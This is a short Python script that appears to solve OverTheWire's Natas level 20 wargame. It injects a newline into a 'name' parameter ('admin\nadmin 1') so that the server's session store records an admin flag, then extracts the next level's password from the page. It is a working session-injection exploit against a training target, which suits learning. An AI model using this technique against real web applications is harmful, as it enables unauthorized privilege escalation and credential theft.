import re
import requests
import subprocess
from requests.auth import HTTPBasicAuth

def inject_payload():
    passw = subprocess.run(['getpass', '20'], stdout=subprocess.PIPE).stdout.decode('utf-8')
    auth = HTTPBasicAuth('natas20', passw.strip())
    cook = {'PHPSESSID':'tald'}
    param = {'submit':'Change name', 'name':'admin\nadmin 1', }
    requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
    r = requests.get('http://natas20.natas.labs.overthewire.org/', auth=auth, cookies=cook, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    inject_payload()
